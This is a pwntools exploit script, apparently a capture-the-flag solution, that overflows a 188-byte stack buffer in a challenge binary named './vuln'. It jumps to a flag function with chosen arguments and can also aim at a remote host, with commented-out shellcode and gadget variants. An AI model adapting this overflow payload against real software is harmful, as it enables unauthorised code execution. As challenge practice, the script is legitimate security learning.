#!/usr/bin/python3

from pwn import *

def start():

    context.log_level = 'debug'
    context.binary = ELF('./vuln')

    if len(sys.argv) > 1:
        if sys.argv[1] == 'gdb':
            gdbscript = '''
            init-pwndbg
            continue
            '''
            return gdb.debug('./vuln', gdbscript=gdbscript)
        else:
            host, port = sys.argv[2:]
            return remote(host, int(port))
    return process('./vuln')

def runmain():

    io = start()
    offset = 188
    popal = p32(0x08049324)
    payload = b'a' * offset + popal
    flag = p32(0x080491e2)

    for i in range(8):
        char = 4 * chr(ord('a') + i).encode()
        info(f'the char is: {char}')
        payload += char

    payload += flag
    payload += b'aaaa'
    payload += p32(0xdeadbeef)
    payload += p32(0xC0DED00D)

    # for i in range(26):
    #     char = 4 * chr(ord('a') + i).encode()
    #     info(f'the char is: {char}')
    #     payload += char

    info(f'the payload is: {payload}')

    # pop_esi_edi_ebp = p32(0x08049389) + p32(0xdeadbeef) + p32(0xC0DED00D) + p32(0)
    # payload = b'a' * offset + pop_esi_edi_ebp + p32(0x080491E2)
    # payload = b'a' * offset + asm(shellcraft.i386.mov('eax', 0xdeadbeef))

    # payload = flat(
    #     {
    #         offset: [
    #             asm(shellcraft.i386.mov('edi', 0xdeadbeef).rstrip())
    #         ]
    #     }
    # )

    input('IDA>')
    io.sendlineafter('You know who are 0xDiablos:', payload)
    io.interactive()

if __name__ == '__main__':
    runmain()